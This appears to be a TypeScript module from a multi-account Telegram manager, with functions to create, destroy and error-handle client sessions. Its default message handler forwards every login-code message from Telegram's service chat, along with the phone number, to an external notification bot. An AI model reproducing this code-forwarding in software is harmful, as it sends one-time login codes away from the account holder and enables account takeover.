import { Api, TelegramClient } from 'telegram';
import { StringSession } from 'telegram/sessions';
import { NewMessage, NewMessageEvent } from 'telegram/events';
import { LogLevel } from 'telegram/extensions/Logger';
import { sleep } from 'telegram/Helpers';
import { TgContext } from './types';
import { getCredentialsForMobile } from '../../../utils';
import { parseError } from '../../../utils/parseError';
import { fetchWithTimeout } from '../../../utils/fetchWithTimeout';
import { notifbot } from '../../../utils/logbots';
import { generateTGConfig } from '../utils/generateTGConfig';
import { withTimeout } from '../../../utils/withTimeout';
import { unregisterClient } from '../utils/connection-manager';

export async function createClient(
    ctx: TgContext,
    session: StringSession,
    handler: boolean = true,
    handlerFn?: (event: NewMessageEvent) => Promise<void>
): Promise<TelegramClient> {
    const tgCreds = await getCredentialsForMobile(ctx.phoneNumber);
    const apiHash = tgCreds.apiHash;
    const apiId = tgCreds.apiId;
    const tgConfiguration = await generateTGConfig(ctx.phoneNumber);

    let client: TelegramClient | null = null;

    try {
        await withTimeout(async () => {
            client = new TelegramClient(session, apiId, apiHash, tgConfiguration);
            client.setLogLevel(LogLevel.ERROR);
            (client as any)._errorHandler = (error: Error) => { handleClientError(ctx, error); };
            await client.connect();
            ctx.logger.info(ctx.phoneNumber, 'Connected Client Succesfully');
        }, {
            timeout: 180000,
            errorMessage: `[Tg Manager]\n${ctx.phoneNumber}: Client Creation TimeOut\n`,
        });

        if (!client) {
            throw new Error(`Client is null after connection attempt for ${ctx.phoneNumber}`);
        }

        if (handler && client) {
            if (handlerFn) {
                ctx.logger.info(ctx.phoneNumber, 'Adding Custom Event Handler');
                client.addEventHandler(async (event: NewMessageEvent) => { await handlerFn(event); }, new NewMessage());
            } else {
                ctx.logger.info(ctx.phoneNumber, 'Adding Default Event Handler');
                client.addEventHandler(async (event: NewMessageEvent) => { await handleIncomingEvent(ctx, event); }, new NewMessage());
            }
            if (!client.connected) {
                throw new Error(`Client not connected after connection attempt for ${ctx.phoneNumber}`);
            }
        }

        return client;
    } catch (error) {
        ctx.logger.error(ctx.phoneNumber, 'Client creation failed', error);
        if (client) {
            try {
                await client.destroy();
            } catch (destroyError) {
                ctx.logger.error(ctx.phoneNumber, 'Error destroying failed client', destroyError);
            }
        }
        throw error;
    }
}

export async function destroyClient(ctx: TgContext, session: StringSession): Promise<void> {
    if (ctx.client) {
        try {
            ctx.client._errorHandler = null;
            await ctx.client?.destroy();
            ctx.client._eventBuilders = [];
            session?.delete();
            await sleep(2000);
            ctx.logger.info(ctx.phoneNumber, 'Client Disconnected Sucessfully');
        } catch (error) {
            parseError(error, `${ctx.phoneNumber}: Error during client cleanup`);
        } finally {
            if (ctx.client) {
                ctx.client._destroyed = true;
                if (ctx.client._sender && typeof ctx.client._sender.disconnect === 'function') {
                    await ctx.client._sender.disconnect();
                }
            }
        }
    }
}

export function handleClientError(ctx: TgContext, error: Error): NodeJS.Timeout | null {
    const { contains } = require('../../../utils');
    const errorDetails = parseError(error, `${ctx.phoneNumber}: RPC Error`, false);
    if ((error.message && error.message == 'TIMEOUT') || contains(errorDetails.message, ['ETIMEDOUT'])) {
        ctx.logger.error(ctx.phoneNumber, `Timeout error occurred for ${ctx.phoneNumber}`, error);
        return setTimeout(async () => {
            if (ctx.client && !ctx.client.connected) {
                ctx.logger.debug(ctx.phoneNumber, 'disconnecting client Connection Manually');
                await unregisterClient(ctx.phoneNumber);
            } else if (ctx.client) {
                ctx.logger.debug(ctx.phoneNumber, 'Client Connected after Retry');
            } else {
                ctx.logger.debug(ctx.phoneNumber, 'Client does not exist');
            }
        }, 10000);
    }
    return null;
}

export async function handleIncomingEvent(ctx: TgContext, event: NewMessageEvent): Promise<void> {
    if (event.isPrivate) {
        if (event.message.chatId.toString() == '777000') {
            ctx.logger.info(ctx.phoneNumber, event.message.text.toLowerCase());
            ctx.logger.info(ctx.phoneNumber, `Login Code received for - ${ctx.phoneNumber}\nActiveClientSetup - TelegramManager.activeClientSetup`);
            ctx.logger.info(ctx.phoneNumber, 'Date :', new Date(event.message.date * 1000));
            await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`${process.env.clientId}:${ctx.phoneNumber}\n${event.message.text}`)}`);
        }
    }
}
